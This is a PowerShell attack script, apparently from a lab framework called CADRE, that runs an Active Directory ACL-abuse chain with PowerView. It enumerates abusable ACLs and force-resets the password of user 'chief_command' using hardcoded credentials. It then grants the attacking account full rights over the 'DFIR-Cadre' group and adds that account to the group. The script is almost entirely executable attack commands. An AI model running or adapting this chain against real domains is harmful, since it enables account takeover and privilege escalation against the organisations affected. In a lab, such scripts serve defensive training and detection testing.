# CADRE — WT#013-016 ACL Abuse (WriteDacl / GenericWrite / ForceChangePassword / GenericAll)
. ..\lib\cadre-env.ps1
. ..\lib\common.ps1
print_banner "WT#013-016 - ACL Abuse"
start_attack "013" "ACL Abuse chain"
require_tool powerview.ps1

step "Enumerate interesting ACLs we can abuse (PowerView)"
run_cmd ". .\powerview.ps1; Find-InterestingDomainAcl -ResolveGUIDs | ? {`$_.IdentityReferenceName -match 'Cadre'} | Select IdentityReferenceName,ActiveDirectoryRights,ObjectDN"

step "WT#015 ForceChangePassword: reset a target user's password"
run_cmd "Set-DomainUserPassword -Identity chief_command -AccountPassword (ConvertTo-SecureString 'N3wP@ss!' -AsPlainText -Force) -Credential (New-Object System.Management.Automation.PSCredential('hunter_dfir',(ConvertTo-SecureString 'DF1R_Hunt3r!' -AsPlainText -Force)))"

step "WT#013/014 WriteDacl/GenericWrite: grant ourselves rights, then add to a privileged group"
run_cmd "Add-DomainObjectAcl -TargetIdentity 'DFIR-Cadre' -PrincipalIdentity $ATTACK_USER -Rights All"
run_cmd "Add-DomainGroupMember -Identity 'DFIR-Cadre' -Members $ATTACK_USER"

step "WT#016 GenericAll on OU: push a malicious ACE / link a GPO (see WT#023)"
run_cmd "Write-Host '  GenericAll on OU -> delegate control or gPLink abuse'"

result $LASTEXITCODE "ACL Abuse completed"
